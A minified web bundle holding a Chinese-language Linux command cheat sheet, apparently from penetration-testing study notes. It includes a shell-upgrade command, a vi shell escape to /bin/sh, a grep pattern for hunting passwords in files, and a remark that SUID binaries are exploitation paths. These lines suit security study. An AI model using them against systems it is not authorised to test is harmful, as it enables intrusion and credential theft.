(window.webpackJsonp=window.webpackJsonp||[]).push([[31,9],{"+/qY":function(nu,U,f){"use strict";f.r(U),f.d(U,"Linux_Unix_\u624B\u518C",function(){return F}),f.d(U,"Linux\u5E38\u89C1\u6307\u4EE4_cfg_\u4E8C\u7EA7\u624B\u518C",function(){return k});var R=f("tJVT"),h=f("q1tI"),l=f.n(h),j=f("/qoP"),n=f("ysNt"),u=f("QL8i"),t=n.e.singleATag_blank,s={name:"\u3010Linux\u3011\u5E38\u89C1\u3010\u6307\u4EE4\u3011",desc:l.a.createElement(l.a.Fragment,null),steps:[{name:"\u65B9\u4FBF\u7684\u901F\u67E5\u624B\u518C",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(l.a.createElement("h1",null,"\u65B9\u4FBF\u7684\u901F\u67E5\u624B\u518C"),u.\u540C\u540D\u65B9\u6CD5_\u547D\u4EE4_Helper.\u5FEB\u901F\u5B66\u4E60\u65B9\u6848.Linux\u65B9\u6CD5))},{name:"\u7BA1\u9053\u547D\u4EE4",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(l.a.createElement("h1",null,"\u7BA1\u9053\u547D\u4EE4"),`
              \u3010|\u3011
                  \u8FDE\u63A5\u591A\u4E2A\u547D\u4EE4\u3002
                  \u5E38\u89C1\u793A\u4F8B\uFF1A
                      cat  *  |  grep  -i  <\u5173\u952E\u5B57>*

              \u3010mkfifo\u3011
                  \u521B\u5EFA\u4E00\u4E2AFIFO\u7279\u6B8A\u6587\u4EF6                            \uFF08\u5148\u8FDB\u5148\u51FA\u961F\u5217 First In First Out\uFF09
                  \u662F\u4E00\u4E2A\u547D\u540D\u7BA1\u9053\uFF08\u53EF\u4EE5\u7528\u6765\u505A\u8FDB\u7A0B\u4E4B\u95F4\u901A\u4FE1\u7684\u6865\u6881\uFF09       \uFF08named pipe\uFF09

                  \u5176\u5B83\u7684\uFF1F\uFF1F\uFF1F

              \u3010>\u3011
                  \u8986\u76D6\u5199\u5165

              \u3010>>\u3011
                  \u8FFD\u52A0\u5199\u5165\uFF0C\u8FFD\u52A0\u5230\u5C3E\u90E8

              \u30102>/dev/null\u3011
                  \u5C06\u62A5\u9519\u4FE1\u606F\uFF0C\u5168\u90E8\u5BFC\u5411\u3010\u7A7A\u8BBE\u5907\u3011\u3002
                      \u5B9E\u9645\u4F5C\u7528\uFF0C\u5C31\u662F\u3010\u4E0D\u663E\u793A\u9519\u8BEF\u4FE1\u606F\u3011
                  \u672C\u8D28\u7406\u89E3\uFF1A
                      \u7B80\u5355\u7406\u89E3\u4E3A\uFF1A
                          \u30102\u3011\u662F\u7CFB\u7EDF\u5185\u7F6E\u6807\u8BC6\uFF0C\u7C7B\u4F3C\u4E8E\u53D8\u91CF
                          \u3010>\u3011\u662F\u7BA1\u9053\u7B26
                          \u3010/dev/null\u3011\u662F\u865A\u62DF\u5316\u7684\u7A7A\u8BBE\u5907\u3002    \uFF08\u5176\u5B9E\u4EE3\u8868\uFF0C\u4EC0\u4E48\u4E5F\u6CA1\u6709\uFF09

            `))},{name:"\u8EAB\u4EFD\u67E5\u770B",desc:l.a.createElement(l.a.Fragment,null),content:Promise.all([Promise.resolve().then(f.bind(null,"QL8i")),Promise.resolve().then(f.bind(null,"ONbu"))]).then(function(o){var c=Object(R.a)(o,2),b=c[0],e=c[1];return l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(l.a.createElement("h1",null,"\u8EAB\u4EFD\u67E5\u770B"),`

              whoami
            `,b.\u540C\u540D\u65B9\u6CD5_\u547D\u4EE4_Helper.whoami.Linux\u65B9\u6CD5,`

              id
                  123

              lslogins
                  \u5217\u4E3E\u7528\u6237\u7684\u5217\u8868\uFF0C\u548C\u5F53\u524D\u72B6\u6001

              groups
                  123

              mkpasswd

                  \u4ECB\u7ECD\uFF1B
                      \u8D44\u6599\uFF1Ahttps://deepinout.com/linux-cmd/linux-password-and-certificate-management-related-cmd/linux-cmd-mkpasswd.html

                      \u4F7F\u7528mkpasswd\u547D\u4EE4\u53EF\u4EE5\u751F\u6210\u65B0\u7684\u5BC6\u7801\uFF0C\u9009\u62E9\u5C06\u5176\u5E94\u7528\u4E8E\u7528\u6237\u3002

                  \u547D\u4EE4\uFF1A
                      mkpasswd  [\u9009\u9879]  [\u7528\u6237]

                      \u4E3E\u4F8B\uFF1A\u300A  mkpasswd  -m  sha-512  <\u4F60\u7684\u660E\u6587\u5BC6\u7801>  \u300B

                          \u7ED3\u679C\u793A\u4F8B\uFF1A
                              $6$sbnjIZBtmRds.L/E$fEKZhosqeHykiVWT1IBGju43WdVdDauv5RsvIPifi32CC2TTNU8kHOd2ToaW8fIX7XXM8P5Z8j4NB1gJGTONl1
                                  \u8FD9\u4E2A\u503C\uFF0C\u53EF\u80FD\u6BCF\u6B21\u90FD\u4E0D\u4E00\u6837\uFF1B\u56E0\u4E3A\u53EF\u80FD\u6709\u3010salt\u76D0\u503C\u3011

                                  \u3010$6\u3011\uFF0C\u5F53\u524D\u4F7F\u7528\u7684\u3010hash\u7B97\u6CD5\u3011\u7684\u6807\u8BC6\u7B26\u3002\u5728\u672C\u4F8B\u4E2D\uFF0C\u5C55\u793A\u4E3A\u3010SHA-512\u3011

                  \u5E38\u89C1\u9009\u9879\uFF1A
                      \u3010-m\u3011\uFF0C\u6307\u5B9A\u52A0\u5BC6\u7B97\u6CD5

            `))})},{name:"\u4FEE\u6539\u914D\u7F6E\u6587\u4EF6",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(l.a.createElement("h1",null,"\u4FEE\u6539\u914D\u7F6E\u6587\u4EF6"),`
              proxychains4
                  nano  /etc/proxychains.conf

              apt\u6E90
                  nano  /etc/apt/sources.list

            `))},{name:"\u6587\u4EF6\u7CFB\u7EDF",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(l.a.createElement("h1",null,"\u6587\u4EF6\u7CFB\u7EDF"),`

              \u78C1\u76D8\u67E5\u770B

                  \u78C1\u76D8\u7A7A\u95F4
                      \u3010df  -h\u3011\uFF0C\u67E5\u770B\u78C1\u76D8\u4F7F\u7528\u7387

                      \u3010du  -sh  *\u3011\uFF0C\u67E5\u770B\u5177\u4F53\u6BCF\u4E2A\u76EE\u5F55  \u5360\u7528\u78C1\u76D8\u7A7A\u95F4
                          1. \u53EA\u67E5\u770B\u3010\u5F53\u524D\u76EE\u5F55\u3011\u4E0B\u7684\uFF0C\u6240\u4EE5\u9700\u8981  \u5148\u8FDB\u5165\u76EE\u5F55

                  Inode
                      \u3010df  -i\u3011\uFF0C\u67E5\u770B Inode \u4F7F\u7528\u60C5\u51B5

                      \u3010for  i  in  <\u5F53\u524D\u76EE\u5F55>/*;  do  echo  $i;  find  $i  |  wc  -l;  done  \u3011
                          \u9010\u4E2A\u6253\u5370\uFF0C\u6BCF\u4E2A\u76EE\u5F55\u7684  Inode\u60C5\u51B5

              \u6587\u4EF6\u7CFB\u7EDF\u6302\u8F7D

                  mount

                      123

                      \u8FDC\u7A0B\u6302\u8F7DSMB\u7684share
                          \u300Amount  -t  cifs  -o  ro,username=<\u7528\u6237\u540D>,password=<\u5BC6\u7801>  <Share\u5730\u5740>  <\u672C\u5730\u76EE\u5F55\u5982/mnt>    \u300B
                              \u3010-t\u3011\uFF0C\u6307\u5B9A\u3010\u6587\u4EF6\u7CFB\u7EDF\u7C7B\u578B\u3011
                                  \u76EE\u524D\u652F\u6301\u7684\u5305\u62EC\uFF1Aadfs,  affs,  autofs,  cifs, coda, coherent, cramfs, debugfs, devpts, efs, ext, ext2, ext3, ext4, hfs, hfsplus, hpfs, iso9660, jfs, minix,  msdos,  ncpfs,  nfs, nfs4,  ntfs,  proc,  qnx4,  ramfs, reiserfs, romfs, squashfs, smbfs, sysv, tmpfs, ubifs, udf, ufs, umsdos, usbfs, vfat, xenix, xfs, xiafs.
                              \u3010-o\u3011\uFF0C\u6307\u5B9A\u9009\u9879
                                  \u7528\u3010\u9017\u53F7\u5206\u9694\u7684\u9009\u9879\u5B57\u7B26\u4E32\u3011\uFF0C\u6765\u8868\u793A
                                  \u5E38\u89C1\u8868\u793A\uFF1A
                                      \u3010ro\u3011\uFF0Cread-only\uFF0C\u53EA\u8BFB

            `))},{name:"\u7CFB\u7EDF\u4FE1\u606F\u67E5\u770B\u3002\u7248\u672C\u3001\u8FDB\u7A0B\u3001IP\u3001\u7F51\u7EDC",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(l.a.createElement("h1",null,"\u7CFB\u7EDF\u4FE1\u606F\u67E5\u770B"),`

              \u7CFB\u7EDF\u7248\u672C\u4FE1\u606F

                  \u67E5\u770BLinux\u3010\u5185\u6838\u7248\u672C\u3011
                      cat  /proc/version
                      uname  -a

                  \u67E5\u770BLinux\u3010\u7CFB\u7EDF\u7248\u672C\u3011
                      lsb_release  -a
                      cat  /etc/issue


                  \u5BF9\u4EE5\u4E0A\u7684\u603B\u7ED3\uFF08\u4E00\u6B21\u6027\u7EFC\u5408\u6307\u4EE4\uFF09

                      cat  /proc/version  &&  uname  -a  &&  lsb_release  -a  &&  cat  /etc/issue
                          \uFF08\u9700\u8981\u624B\u52A8\u7EF4\u62A4\uFF09

              \u8FDB\u7A0B\u3001IP\u3001\u7F51\u7EDC

                  ip -a

                  ifconfig

                  ps
                      ps  aux
                          \u4E3E\u4F8B\uFF1A\u300Aps aux | grep mongo\u300B

                      ps -ef
                          \u548C\u4E0A\u9762\u529F\u80FD\u4E00\u6837\uFF0C\u53EA\u662F\u8F93\u51FA\u683C\u5F0F\uFF0C\u9075\u4ECE\u4E0D\u540C\u6807\u51C6

                  fport               \uFF08Kali\u4E13\u7528\u5DE5\u5177\uFF09
                      \u67E5\u770B\u672C\u5730\u7AEF\u53E3

            `))},{name:"\u591A\u4EFB\u52A1\u3001\u524D\u540E\u53F0\u4EFB\u52A1",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(`

          \u8D44\u6599\uFF1A
              https://www.linuxprobe.com/front-background-tasks.html

          <\u5E38\u89C4\u6307\u4EE4>  &
              \u76F4\u63A5\u7528\u3010\u540E\u53F0\u6A21\u5F0F\u3011\u542F\u52A8\u4EFB\u52A1\uFF0C\u4FDD\u6301\u3010\u8FD0\u884C\u4E2D\u3011\u72B6\u6001\u3002

          \u3010Ctrl+Z\u3011
              \u5C06\u5F53\u524D\u4EFB\u52A1\uFF0C\u5207\u6362\u5230\u3010\u540E\u53F0\u3011\uFF0C\u5E76\u3010\u505C\u6B62\u8FD0\u884C\u3011\u3002

          jobs
              jobs
                  \u5C55\u793A\u3010\u540E\u53F0\u4EFB\u52A1\u3011
                      \u5F62\u5F0F\uFF1A   [\u7F16\u53F7]\u2014\u2014PID\u2014\u2014\u8FD0\u884C\u72B6\u6001\u2014\u2014\u4EFB\u52A1\u6307\u4EE4
              jobs  -l
                  \u5C55\u793A\u3010\u540E\u53F0\u4EFB\u52A1\u3011\uFF0C\u4EE5\u5217\u8868\u5F62\u5F0F

          fg
              fg
                  \u5C06\u3010\u6700\u8FD1\u4E00\u6B21\u4EFB\u52A1\u3011\uFF0C\u8C03\u5230\u524D\u53F0
              fg  %<\u7F16\u53F7>
                  \u5C06\u3010\u6307\u5B9A\u7F16\u53F7\u4EFB\u52A1\u3011\uFF0C\u8C03\u5230\u524D\u53F0

          bg
              bg
                  \u5C06\u3010\u5DF2\u5728\u540E\u53F0\u3011\u7684\u3010\u6700\u8FD1\u4E00\u6B21\u4EFB\u52A1\u3011\uFF0C\u3010\u91CD\u65B0\u6062\u590D\u8FD0\u884C\u3011
              bg  %<\u7F16\u53F7>
                  \u5C06\u3010\u5DF2\u5728\u540E\u53F0\u3011\u7684\u3010\u6307\u5B9A\u7F16\u53F7\u4EFB\u52A1\u3011\uFF0C\u3010\u91CD\u65B0\u6062\u590D\u8FD0\u884C\u3011

          \u5173\u95ED\u591A\u4EFB\u52A1
              kill  <PID>
                  \u5E38\u89C4\u5173\u95ED
              kill  %<\u7F16\u53F7>
                  \u6309\u3010\u7F16\u53F7\u3011\u8FDB\u884C\u5173\u95ED

          `))},{name:"\u7F51\u7EDC\u8BF7\u6C42",desc:l.a.createElement(l.a.Fragment,null),content:Promise.all([Promise.resolve().then(f.bind(null,"QL8i")),Promise.resolve().then(f.bind(null,"ONbu"))]).then(function(o){var c=Object(R.a)(o,2),b=c[0],e=c[1];return l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(l.a.createElement("h1",null,"\u7F51\u7EDC\u8BF7\u6C42"),`



              curl

                  \u57FA\u672C\u4ECB\u7ECD\uFF1A
                      \u662F\u4E00\u4E2A\u547D\u4EE4\u884C\u5DE5\u5177\uFF0C\u7528\u4E8E\u4F7F\u7528 URL \u8BED\u6CD5\u4F20\u8F93\u6570\u636E
                      \u652F\u6301 DICT\u3001FILE\u3001FTP\u3001FTPS\u3001GOPHER\u3001HTTP\u3001HTTPS\u3001IMAP\u3001IMAPS\u3001LDAP\u3001LDAPS\u3001POP3\u3001 POP3S\u3001RTMP\u3001RTSP\u3001SCP\u3001SFTP\u3001SMTP\u3001SMTPS\u3001TELNET \u548C TFTP.curl \u652F\u6301 SSL \u8BC1\u4E66\u3001HTTP POST\u3001HTTP PUT\u3001FTP \u4E0A\u4F20\u3001\u57FA\u4E8E HTTP \u8868\u5355\u7684\u4E0A\u4F20\u3001\u4EE3\u7406\u3001cookie\u3001
                      \u7528\u6237+\u5BC6\u7801\u8EAB\u4EFD\u9A8C\u8BC1\uFF08\u57FA\u672C\u3001\u6458\u8981\u3001NTLM\u3001Negotiate\u3001kerberos...)\u3001\u6587\u4EF6\u4F20\u8F93\u6062\u590D\u3001\u4EE3\u7406\u96A7\u9053
                      \u548C\u5927\u91CF\u5176\u4ED6\u6709\u7528\u7684\u6280\u5DE7

                  \u57FA\u672C\u4F7F\u7528
                      curl  -v  <url\u5730\u5740>
                          \u300A-v\u300B\uFF0C\u65E5\u5FD7\u8F93\u51FA\uFF0C

                  \u5E38\u89C1\u9009\u9879
                      \u300A-v\u300B\uFF0C\u65E5\u5FD7\u8F93\u51FA
                          verbose\u7EA7\u522B
                          \u663E\u793A(\u66F4\u8BE6\u7EC6)\u901A\u4FE1\u7684\u6574\u4E2A\u8FC7\u7A0B

                      \u300A--trace\u300B\uFF0C\u65E5\u5FD7\u8F93\u51FA
                          \u8F93\u51FA\u539F\u59CB\u7684\u4E8C\u8FDB\u5236\u6570\u636E
                          \u6BD4 verbose \u66F4\u4E3A\u8BE6\u7EC6

                      \u3010-K\u3011\uFF0C\u6307\u5B9A\u4E00\u4E2A\u3010\u914D\u7F6E\u6587\u4EF6\u3011
                          123


              wget
            `,b.\u540C\u540D\u65B9\u6CD5_\u547D\u4EE4_Helper.wget.Linux\u65B9\u6CD5,`


            `))})},{name:"\u7279\u6B8A\u547D\u4EE4",desc:l.a.createElement(l.a.Fragment,null),content:l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(l.a.createElement("h1",null,"\u7279\u6B8A\u547D\u4EE4"),`

            script

                script  /dev/null  -c  bash

            rlwrap
                \u4F3C\u4E4E\u662F\u3010\u4E00\u5C42\u5305\u88F9\u5668\u3011\uFF1F\uFF1F\uFF1F

            `))},{name:"\u76EE\u5F55\u6587\u4EF6",desc:l.a.createElement(l.a.Fragment,null),content:Promise.all([Promise.resolve().then(f.bind(null,"QL8i")),Promise.resolve().then(f.bind(null,"ONbu"))]).then(function(o){var c=Object(R.a)(o,2),b=c[0],e=c[1];return l.a.createElement(l.a.Fragment,null,j.g.\u7EC4\u4EF6\u624B\u518C.\u8F6C\u5316\u8001\u6587\u672C_\u4E3Apre\u6807\u7B7E(l.a.createElement("h1",null,"\u76EE\u5F55\u6587\u4EF6"),`

              \u524D\u5F80\u76EE\u5F55
            `,b.\u540C\u540D\u65B9\u6CD5_\u547D\u4EE4_Helper.cd.Linux\u65B9\u6CD5,`

              \u65B0\u5EFA
                  mkdir  <\u76EE\u5F55>

                  mkdir  -p  <\u591A\u7EA7\u76EE\u5F55\u4E2D\u95F4\u65AD\u5C42>
                      \u81EA\u52A8\u521B\u5EFA\uFF0C\u4E2D\u95F4\u4E0D\u5B58\u5728\u7684\u76EE\u5F55

                  touch  <\u65B0\u6587\u4EF6\u540D>

              \u5220\u9664
                  rm

              \u67E5\u770B

                  ls

                      ls  -al
                          \u7B49\u540C\u4E8E\u3010ls  -l  -a\u3011

                          \u3010-l\u3011\uFF0C\u5217\u8868\u663E\u793A

                          \u3010-a\u3011\uFF0C\u663E\u793A\u5168\u90E8\u6587\u4EF6

                      \u3010\u5E38\u89C1\u9009\u9879\u3011
                          \u3010-t\u3011
                              \u6309\u65F6\u95F4\u6233\uFF0C\u4ECE\u65B0\u5230\u8001 \u6392\u5E8F
                          \u3010-r\u3011
                              (\u5728\u5DF2\u6709\u987A\u5E8F\u4E0A)\u53CD\u5411\u6392\u5E8F
                                  \u6BD4\u5982\uFF0C\u5C06\u65F6\u95F4\u6233  \u4ECE\u8001\u5230\u65B0 \u6392\u5E8F



                  cat
                      cat  <\u6587\u4EF6\u8DEF\u5F84>
                          \u67E5\u770B\u5355\u4E2A\u6587\u4EF6

                      cat  *
                          \u67E5\u770B\u3010\u5F53\u524D\u76EE\u5F55\u3011\u7684\u3010\u6240\u6709\u6587\u4EF6\u3011\u5185\u5BB9

                      find . -name '*.*' -exec cat {} \\;
                          \u53E6\u4E00\u79CD\u5F62\u5F0F\uFF0C\u9012\u5F52\u76EE\u5F55\u3010\u67E5\u770B\u5185\u5BB9\u3011

                  grep
                      \u3010glob\u901A\u914D\u7B26\u3011\u7684\u7279\u6B8A\u60C5\u51B5\uFF1A

                          \u3010*pass*\u3011\u6CA1\u6709\u610F\u4E49\u3002\u56E0\u4E3A\u3010*\u3011\u524D\u9762\u5FC5\u987B\u8981\u6709\u4E1C\u897F
                              \u3010*\u3011\u4EE3\u8868\u91CD\u590D\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F

                          \u3010pass*\u3011\u6709\u610F\u4E49\u3002

                      grep  -i  "<glob\u901A\u914D\u7B26>"
                          \u4E00\u822C\u6765\u8BF4\uFF0C\u975E\u5E38\u5EFA\u8BAE\u3010\u5305\u88F9\u53CC\u5F15\u53F7\u3011\uFF0C \u8FD9\u6837\u5904\u7406\u3010\u7279\u6B8A\u7B26\u53F7\u3011\u4F1A\u6B63\u5E38\u5F88\u591A
                          \u3010-i\u3011\uFF0C\u5FFD\u7565\u5927\u5C0F\u5199

                      \u9012\u5F52\u67E5\u627E\u76EE\u5F55\u4E2D\u6587\u4EF6
                          grep  -r  "\u5173\u952E\u5B57"  <\u8DEF\u5F84\u5982\u3010./*\u3011>
                              \u9ED8\u8BA4\u4E0D\u4F1A\u8DDF\u968F\u3010symbol link \u7B26\u53F7\u94FE\u63A5\u3011

                      \u3010\u53CD\u5411\u6392\u9664\u3011\u4F3C\u4E4E\u4E0D\u592A\u597D\u7528\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F

                      \u5E38\u89C1\u9009\u9879\uFF1A
                          \u3010-a\u3001 --text\u3011
                              \u8D44\u6599\uFF1Ahttps://unix.stackexchange.com/questions/335716/grep-returns-binary-file-standard-input-matches-when-trying-to-find-a-string
                              \u50CF\u5904\u7406\u3010\u6587\u672C\u6587\u4EF6\u3011\u4E00\u6837\u5904\u7406\u3010\u4E8C\u8FDB\u5236\u6587\u4EF6\u3011
                                  \u5F53\u62A5\u9519\u3010Binary file (standard input) matches\u3011\u65F6\uFF0C\u7528\u8FD9\u4E2A\u9009\u9879

                          \u3010-C  <\u6570\u5B57>\u3011
                              \uFF1F\uFF1F\uFF1F\uFF1F\uFF1F\uFF1F

                          \u3010-E\u3011
                              \u5C06\u3010\u5339\u914D\u6A21\u5F0F\u3011\u5207\u6362\u4E3A\u3010\u6B63\u5219\u8868\u8FBE\u5F0F\u3011\u6A21\u5F0F
                                  \uFF08\u592A\u68D2\u4E86\uFF0C\u8FD9\u662F\u6211\u975E\u5E38\u719F\u6089\u7684\u9886\u57DF\uFF01\uFF01\uFF01\u80FD\u591F\u5B9E\u73B0\u5F88\u591A\u3010\u590D\u6742\u7684\u67E5\u627E\u529F\u80FD\u3011\uFF09
                              \u603B\u7ED3\u51FA\uFF0C\u4E00\u4E9B\u5E38\u7528\u6A21\u5F0F\uFF1A
                                  (pwd)|(pass)|(passw)
                                  \uFF08\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\uFF01\u8FD9\u91CC\uFF0C\u53EF\u4EE5\u548C\u3010web\u654F\u611F\u5185\u5BB9\u3011\u653E\u5728\u4E00\u5757\u513F\uFF01\uFF01\uFF01\uFF09

                      cut
                          123

                      tr
                          123

                      sed
                          123


                  \u4E8C\u8FDB\u5236\u76F8\u5173

            `,b.\u540C\u540D\u65B9\u6CD5_\u547D\u4EE4_Helper.strings.Linux\u65B9\u6CD5,`


                      file
                          \u67E5\u770B\u6587\u4EF6\u7C7B\u578B
                              file  <\u6587\u4EF6\u8DEF\u5F84>

                              \u5982\u679C\u6709\u3010suid set\u3011\u96C6\uFF0C\u5219\u662F\u3010\u6709\u6F5C\u529B\u3011\u7684\u3010\u5229\u7528\u8DEF\u5F84\u3011\u3002
                                  \uFF08\u89C1\u3010\u6743\u9650\u63D0\u5347\u3011\uFF09

                          \u68C0\u67E5\u4E8C\u8FDB\u5236\u3010\u6587\u4EF6\u7C7B\u578B\u3011
                              file  <\u4E8C\u8FDB\u5236\u6587\u4EF6>

                          \u6B64\u5916\uFF0C\u8FD8\u6709\u4E00\u4E9B\u3010\u7B2C\u4E09\u65B9\u5F00\u6E90\u5DE5\u5177\u3011\uFF1A
                              \u300ADiE\u300B\uFF0C\u89C1\u300A\u300B

                      checksec
                          \u68C0\u67E5\u4E8C\u8FDB\u5236\u3010\u5185\u5B58\u4FDD\u62A4\u3011

                          \u7528\u6CD5\uFF1A
                              checksec  <\u4E8C\u8FDB\u5236\u6587\u4EF6>

                      xxd
                          \u7528\u4E8E\u3010\u4E8C\u8FDB\u5236binary\u3011\u548C\u3010hexdump\u5341\u516D\u8FDB\u5236\u8F6C\u50A8\u3011\uFF0C\u4E4B\u95F4\uFF0C\u8FDB\u884C\u8F6C\u6362\u3002

                          binary \u8F6C hexdump\uFF1A
                              xxd  <\u4E8C\u8FDB\u5236\u6587\u4EF6>

                          \u6587\u672C \u8F6C \u4E8C\u8FDB\u5236\u8F6C\u50A8\uFF1A
                              xxd  -b  <\u6587\u672C\u6587\u4EF6>

                          hexdump \u8F6C binary\uFF1A
                              xxd  -r  <\u8F93\u5165\u6587\u4EF6>  <\u8F93\u51FA\u6587\u4EF6>
                              xxd  -r  <\u8F93\u5165\u6587\u4EF6>  >  <\u8F93\u51FA\u6587\u4EF6>


            `,j.g.\u7EC4\u4EF6\u624B\u518C.get\u6309\u94AE\u548C\u5F39\u51FA\u624B\u518C_\u6709\u65E0cfg\u7686\u53EF(e.\u6743\u9650\u63D0\u5347_\u63D0\u6743_\u540E\u6E17\u900F_\u5185\u7F51\u6E17\u900F_\u624B\u518C),`
                  more
                      \u3010space\u3011\u4E0B\u4E00\u9875
                      \u3010back\u3011\u4E0A\u4E00\u9875

                  less
                      \u3010Ctrl+F\u3011forward\uFF0C\u4E0B\u4E00\u9875
                      \u3010Ctrl+B\u3011back\uFF0C\u4E0A\u4E00\u9875

                  head

                  tail

                  tee
                      tee  -a  <\u6587\u4EF6\u8DEF\u5F84>


                  \u6587\u672C\u7F16\u8F91

                      \u3010vi\u3011

                          \u3010\u547D\u4EE4\u6A21\u5F0F\u3011

                              \u3010i\u3011\uFF0C\u8FDB\u5165\u3010\u8F93\u5165\u6A21\u5F0F\u3011
                              \u3010:\u3011\uFF0C\u8F93\u5165\u3010\u547D\u4EE4\u884C\u3011
                                  \u3010:w\u3011\uFF0C\u5199\u5165
                                  \u3010:q\u3011\uFF0C\u9000\u51FA
                                  \u3010:!\u3011\uFF0C\u4EE3\u8868\u5F3A\u5236\u6267\u884C\u3010\u53E6\u4E00\u547D\u4EE4\u3011
                                      123

                          \u3010\u8F93\u5165\u6A21\u5F0F\u3011

                              \u3010ESC\u3011\uFF0C\u8FDB\u5165\u3010\u547D\u4EE4\u6A21\u5F0F\u3011


                          \u547D\u4EE4\u884C\u8FD0\u884C

                              vi  -c  ':!/bin/sh'  /dev/null
                                  \u5FC5\u987B\u8981\u7528\u3010\u5355\u5F15\u53F7\u3011\uFF0C\u624D\u80FD\u6B63\u5E38\u8FD0\u884C
                                      \u3010\u53CC\u5F15\u53F7\u3011\u4F1A\u62A5\u9519

                                  \u540E\u9762\u7684\u3010/dev/null\u3011\uFF0C\u662F\u7528\u6765\u5E72\u561B\u7684\uFF1F
                                      \u597D\u50CF\u53BB\u6389\uFF0C\u4E5F\u6CA1\u5565\u5F71\u54CD\uFF1F\uFF1F\uFF1F

                              \u5E38\u89C1\u9009\u9879
                                  \u3010-c\u3001 --cmd\u3011\uFF0C\u8FD0\u884C\u547D\u4EE4



              \u79FB\u52A8\u590D\u5236
                  mv  <\u6E90\u76EE\u5F55\u6216\u6587\u4EF6>  <\u76EE\u6807\u76EE\u5F55\u6216\u6587\u4EF6>
                      \u76EE\u5F55\u4EE5\u3010/\u3011\u7ED3\u5C3E\uFF0C\u6587\u4EF6\u4E0D\u4EE5\u3010/\u3011\u7ED3\u5C3E

                  copy  <\u6E90\u76EE\u5F55\u6216\u6587\u4EF6>  <\u76EE\u6807\u76EE\u5F55\u6216\u6587\u4EF6>
                      \u3010-r\u3011\uFF0C\u9012\u5F52\u590D\u5236\uFF0C\u4FDD\u7559\u7ED3\u6784

              \u67E5\u627E
                  locate  <\u6587\u4EF6\u540D\u5982\u661F\u53F7>.<\u540E\u7F00\u540D>
                      \u6839\u636E\u6587\u4EF6\u540D\u67E5\u627E
                      \u652F\u6301\u3010glob\u901A\u914D\u7B26\u3011

                  find

                      \u5C0F\u6280\u5DE7\uFF1A
                          \u4E0D\u663E\u793A\u3010\u9519\u8BEF\u4FE1\u606F\u3011\uFF0C\u53BB\u9664\u76F8\u5173\u5E72\u6270\uFF0C\u5E76\u4E14\u3010\u63D0\u9AD8\u641C\u7D22\u6027\u80FD\u3011\uFF1A    \uFF08\u5C31\u5F88\u795E\u5947\uFF09
                              \u4F7F\u7528\u3010\u7BA1\u9053\u7B26\u3011\u5373\u53EF\uFF01\uFF01\uFF01
                                  \u6211\u91CD\u65B0\u590D\u5236\u4E00\u904D\uFF1A\u30102>/dev/null\u3011

                      \u6839\u636E\u3010\u6587\u4EF6\u540D\u3011\u67E5\u627E
                          find  <\u76EE\u5F55\u8DEF\u5F84>  -name  <\u6587\u4EF6\u540D\u53EF\u7528glob\u8868\u8FBE\u5F0F>

                              \u3010-type  d\u3011\uFF0C\u7C7B\u578B\u4E3A\u76EE\u5F55
                              \u3010-type  f\u3011\uFF0C\u7C7B\u578B\u4E3A\u6587\u4EF6

                      \u6839\u636E\u3010\u7528\u6237\u7EC4\u3011\u67E5\u627E
                          find  <\u76EE\u5F55\u8DEF\u5F84>  -group  <\u76EE\u6807\u7528\u6237\u7EC4>
                              \u641C\u7D22\uFF0C\u5C5E\u4E8E\u3010\u76EE\u6807\u7528\u6237\u7EC4\u3011\u7684\u76F8\u5173\u6587\u4EF6

                      \u6839\u636E\u3010\u65F6\u95F4\u3011\u67E5\u627E
                          find  -newerXY  <variable>
                              \u53C2\u8003\u8D44\u6599\uFF1A
                                  (\u6709\u70B9\u5C0F\u7455\u75B5)https://blog.csdn.net/ligeforrent/article/details/75352245

                              \u65E8\u5728\u627E\u5230\u4E00\u4E9B\u3010X\u5C5E\u6027\u3011\u6BD4variable\u7684\u3010Y\u5C5E\u6027\u3011\u66F4 \u3010\u665A\u3011 \u7684\u6587\u4EF6     \uFF08\u8FD9\u53E5\u8BDD\uFF0C\u53C2\u8003\u8D44\u6599\u6B63\u597D\u628A\u5B83\u8BF4\u53CD\u4E86\u3002\u6211\u8FD9\u91CC\u624D\u662F\u5BF9\u7684\uFF09

                                  X\u6307\u4EE3find\u7684\u76EE\u6807\u6587\u4EF6\u5C5E\u6027
                                      X\u53EF\u9009a,c,m;
                                  Y\u4EE3\u8868\u53C2\u7167\u5C5E\u6027\u3002
                                      Y\u53EF\u9009a,c,m,t\u3002
